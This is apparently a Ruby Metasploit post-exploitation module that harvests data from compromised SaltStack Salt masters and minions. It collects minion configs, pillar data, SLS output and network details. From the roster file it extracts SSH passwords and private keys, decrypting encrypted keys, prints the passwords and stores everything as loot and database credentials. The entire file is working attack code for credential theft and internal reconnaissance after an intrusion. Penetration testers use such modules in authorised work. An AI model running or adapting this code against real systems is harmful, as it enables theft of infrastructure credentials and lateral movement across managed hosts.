##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'
require 'net/ssh'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Local::Saltstack

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SaltStack Salt Information Gatherer',
        'Description' => %q{
          This module gathers information from SaltStack Salt masters and minions.
          Data gathered from minions: 1. salt minion config file
          Data gathered from masters: 1. minion list (denied, pre, rejected, accepted)
          2. minion hostname/ip/os (depending on module settings)
          3. SLS
          4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
          5. minion config files
          6. pillar data
        },
        'Author' => [
          'h00die',
          'c2Vlcgo'
        ],
        'SessionTypes' => %w[shell meterpreter],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('MINIONS', [true, 'Minions Target', '*']),
        OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),
        OptBool.new('GETIP', [false, 'Gather IP from minions', true]),
        OptBool.new('GETOS', [false, 'Gather OS from minions', true]),
        OptInt.new('TIMEOUT', [true, 'Timeout for salt commands to run', 120])
      ]
    )
  end

  def gather_pillars
    print_status('Gathering pillar data')
    begin
      out = salt_command_output('salt', [datastore['MINIONS'], '--output=yaml', 'pillar.items'])
      return if out.nil?

      vprint_status(out)
      results = YAML.safe_load(out, permitted_classes: [Symbol]) # Some Salt output contains symbols.
      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')
      print_good("#{peer} - pillar data gathering successfully retrieved and saved to #{store_path}")
    rescue Psych::SyntaxError, Psych::DisallowedClass
      print_error('Unable to process pillar command output')
      return
    end
  end

  def gather_minion_data
    print_status('Gathering data from minions (this can take some time)')
    functions = {}
    functions['network.get_hostname'] = [] if datastore['GETHOSTNAME']
    functions['network.interfaces'] = [] if datastore['GETIP']
    # Grains work across minion platforms; a compound request containing an
    # unavailable platform-specific function can lose otherwise valid results.
    # OS loot retains the function-keyed shape, using grains.item for these keys.
    functions['grains.item'] = %w[kernel os osrelease kernelrelease osfullname] if datastore['GETOS']
    return if functions.empty?

    results = {}
    functions.each do |function, arguments|
      out = salt_command_output('salt', [datastore['MINIONS'], '--output=yaml', function, *arguments])
      next if out.nil?

      vprint_status(out)
      values = YAML.safe_load(out, permitted_classes: [Symbol])
      unless values.is_a?(Hash)
        print_error("Salt #{function} did not return a minion mapping")
        next
      end
      values.each do |name, value|
        results[name] ||= {}
        results[name][function] = value
      end
    rescue Psych::SyntaxError, Psych::DisallowedClass
      print_error("Unable to process Salt #{function} output")
    end
    if results.empty?
      print_error('No minion results returned. Try increasing TIMEOUT or reducing the selected minions')
      return
    end
    store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')
    print_good("#{peer} - minion data gathering retrieved and saved to #{store_path}")

    results.each_value do |result|
      grains = result['grains.item'].is_a?(Hash) ? result['grains.item'] : {}
      host_info = { comments: "SaltStack Salt minion to #{session.session_host}" }
      hostname = result['network.get_hostname']
      host_info[:name] = hostname if datastore['GETHOSTNAME'] && hostname.is_a?(String) && !hostname.empty?
      if datastore['GETOS']
        kernel = grains['kernel']
        host_info[:os_name] = kernel == 'Darwin' ? 'osx' : kernel if kernel.is_a?(String) && !kernel.empty?
        flavor = [grains['osfullname'] || grains['os'], grains['osrelease']].select { |value| value.is_a?(String) && !value.empty? }.join(' ')
        host_info[:os_flavor] = flavor unless flavor.empty?
      end

      unless datastore['GETIP'] # if we dont get IP, can't make hosts
        print_good("Found minion: #{host_info[:name]} - #{host_info[:os_flavor]}")
        next
      end

      interfaces = result['network.interfaces']
      unless interfaces.is_a?(Hash)
        print_error('Salt network.interfaces did not return an interface mapping for a minion')
        next
      end
      interfaces.each do |name, interface|
        next unless interface.is_a?(Hash)

        next if name == 'lo'
        next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface

        Array(interface['inet']).each do |address|
          next unless address.is_a?(Hash)

          ip = address['address']
          next unless Rex::Socket.is_ipv4?(ip.to_s)
          next if ip.start_with?('127.')

          report_host(host_info.merge(mac: interface['hwaddr'], host: ip))
          print_good("Found minion: #{host_info[:name]} (#{ip}) - #{host_info[:os_flavor]}")
        end
      end
    end
  end

  def list_minions_printer
    minions = list_minions
    return if minions.nil?

    tbl = Rex::Text::Table.new(
      'Header' => 'Minions List',
      'Indent' => 1,
      'Columns' => ['Status', 'Minion Name']
    )

    minions['minions'].each do |minion|
      tbl << ['Accepted', minion]
    end
    Array(minions['minions_pre']).each do |minion|
      tbl << ['Unaccepted', minion]
    end
    Array(minions['minions_rejected']).each do |minion|
      tbl << ['Rejected', minion]
    end
    Array(minions['minions_denied']).each do |minion|
      tbl << ['Denied', minion]
    end
    print_good(tbl.to_s)
  end

  def minion
    print_status('Looking for salt minion config files')
    # https://github.com/saltstack/salt/blob/b427688048fdbee106f910c22ebeb105eb30aa10/doc/ref/configuration/minion.rst#configuring-the-salt-minion
    [
      '/etc/salt/minion', # linux, osx
      'C://salt//conf//minion',
      '/usr/local/etc/salt/minion' # freebsd
    ].each do |config|
      next unless file?(config)

      minion = YAML.safe_load(read_file(config))
      if minion['master']
        print_good("Minion master: #{minion['master']}")
      end
      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Salt Minion File')
      print_good("#{peer} - minion file successfully retrieved and saved to #{store_path}")
      break # no need to process more
    end
  end

  def master
    list_minions_printer
    gather_minion_data if datastore['GETOS'] || datastore['GETHOSTNAME'] || datastore['GETIP']

    # get sls files
    unless command_exists?('salt')
      print_error('salt not found on system')
      return
    end
    print_status('Showing SLS')
    output = salt_command_output('salt', [datastore['MINIONS'], 'state.show_sls', '*'])
    unless output.nil?
      store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
      print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")
    end

    # get roster
    # https://github.com/saltstack/salt/blob/023528b3b1b108982989c4872c138d1796821752/doc/topics/ssh/roster.rst#salt-rosters
    print_status('Loading roster')
    priv_values = {}
    ['/etc/salt/roster'].each do |config|
      next unless file?(config)

      begin
        minions = YAML.safe_load(read_file(config))
      rescue Psych::SyntaxError, Psych::DisallowedClass
        print_error("Unable to load #{config}")
        next
      end
      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minions.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
      print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
      unless minions.is_a?(Hash)
        print_error('Salt roster does not contain a minion mapping')
        next
      end

      minions.each do |name, minion|
        next unless minion.is_a?(Hash)

        host = minion['host'] # aka ip
        user = minion['user']
        port = minion['port'] || 22
        passwd = minion['passwd']
        # sudo = minion['sudo'] || false
        priv = minion['priv'] || false
        priv_pass = minion['priv_passwd'] || false

        print_good("Found SSH minion: #{name} (#{host})")
        # make a special print for encrypted ssh keys
        unless priv_pass == false
          print_good("  SSH key #{priv} password #{priv_pass}")
          report_note(host: host,
                      proto: 'TCP',
                      port: port,
                      type: 'SSH Key Password',
                      data: {
                        ssh_key: priv,
                        password: priv_pass
                      })
        end

        host_info = {
          name: name,
          comments: "SaltStack Salt ssh minion to #{session.session_host}",
          host: host
        }
        report_host(host_info)

        cred = {
          address: host,
          port: port,
          protocol: 'tcp',
          workspace_id: myworkspace_id,
          origin_type: :service,
          private_type: :password,
          service_name: 'SSH',
          module_fullname: fullname,
          username: user,
          status: Metasploit::Model::Login::Status::UNTRIED
        }
        if passwd
          cred[:private_data] = passwd
          create_credential_and_login(cred)
          next
        end

        # handle ssh keys if it wasn't a password
        cred[:private_type] = :ssh_key
        cache_key = [priv, priv_pass]
        if priv_values[cache_key]
          cred[:private_data] = priv_values[cache_key]
          create_credential_and_login(cred)
          next
        end

        unless file?(priv)
          print_error("  Unable to find salt-ssh priv key #{priv}")
          next
        end
        input = read_file(priv)
        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack Salt SSH Private Key')
        print_good("  #{priv} stored to #{store_path}")
        begin
          # Use the same parser as credential validation, without an interactive
          # passphrase prompt. Preserve plain OpenSSH keys as supplied; known
          # encrypted PEM keys must be exported unencrypted for the database.
          key = Net::SSH::KeyFactory.load_data_private_key(input, priv_pass || '', false)
          if priv_pass
            unless key.respond_to?(:to_pem)
              print_error("Unable to export decrypted salt-ssh key #{priv}")
              next
            end
            input = key.to_pem
          end
        rescue OpenSSL::OpenSSLError, ArgumentError, Net::SSH::Exception => e
          print_error("Unable to load salt-ssh key #{priv}: #{e.message}")
          elog('Salt SSH key parsing failed', error: e)
          next
        end
        priv_values[cache_key] = input
        cred[:private_data] = input
        create_credential_and_login(cred)
      end
    end
    gather_pillars
  end

  def run
    if session.platform == 'windows'
      # the docs dont show that you can run as a master, nor was the master .bat included as of this writing
      minion
    end
    minion if command_exists?('salt-minion')
    master if command_exists?('salt-master')
  end

end
